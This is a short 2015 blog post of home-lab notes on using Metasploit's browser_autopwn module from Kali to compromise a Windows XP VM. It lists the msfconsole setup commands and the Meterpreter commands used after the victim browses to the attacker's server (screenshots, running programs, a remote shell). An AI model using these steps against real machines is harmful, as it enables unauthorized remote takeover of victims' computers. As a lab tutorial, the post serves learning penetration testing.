---
layout: post
title: "(Auto)pwning XP with Kali"
date: '2015-03-14T00:42:00.002-07:00'
author: Steven Lavoie
tags:
- linux
- pentesting
- tutorial
- kali
---
Just some quick notes on exploiting a Windows XP VM at home.

<div class="separator" style="clear: both; text-align: center;"><a imageanchor="1" style="clear: left; float: left; margin-right: 1em;"><img border="0" height="182" src="/assets/posts/pwning_xp_with_kali/backtrack_logo.jpg"/></a></div>

I booted WinXP SP3 in a VMWare VM with VMWare Player and set the network to bridge (not auto-bridging). Next, select the network device: Virtual Box Host Adapter if you want your VirtualBox VMs to talk to the VMWare one or your regular NIC for your home/local network. Wait to get an IP. I had some issues and had to "disconnect" the NIC in VMWare  and reconnect. [Check here](http://www.sysprobs.com/setup-network-virtualbox-vmware-virtual-machines) if you need some help for the network setup.

In the msfconsole, this is how we'll set up the autopwn:

<pre style="background: #000000; color: #d1d1d1;">msfconsole<br />msf<span style="color: #e34adc;">&gt;</span> user <span style="color: #66347b;">auxiliary/server/browser_autopwn</span><br />msf<span style="color: #e34adc;">&gt;</span> <span style="color: #904050;">set</span> LHOST <span style="color: #e34adc;">&lt;</span><span style="color: #904050;">local</span> IP<span style="color: #e34adc;">&gt;</span><br />msf<span style="color: #e34adc;">&gt;</span> <span style="color: #904050;">set</span> URIPATH /<br />msf<span style="color: #e34adc;">&gt;</span> <span style="color: #904050;">set</span> SRVPORT <span style="color: #008c00;">80</span><br /></pre>

Then visit &lt;local IP&gt; (the IP of your Kali box) in IE and see what happens. I was prompted to install/run an ActiveX control. That required that I download/install Java. I got prompted for an update but denied it. Metasploit opened a Meterpreter session on the Kali box.

Type `sessions` to see what meterpreter sessions are available (there will be no `msf>` prompt).

`sessions -i #` drops to an interactive meterpreter shell with the machine

`screenshot` captures a screencap and saves it to your home directory (type `display [filename]` to see it)

`execute -f explorer` will open an explorer window on the XP machine

Type `help` to see all the options. Like `shell` to drop into a CMD shell on the box. To get out of it, just type `exit` and you'll return to the meterpreter shell.
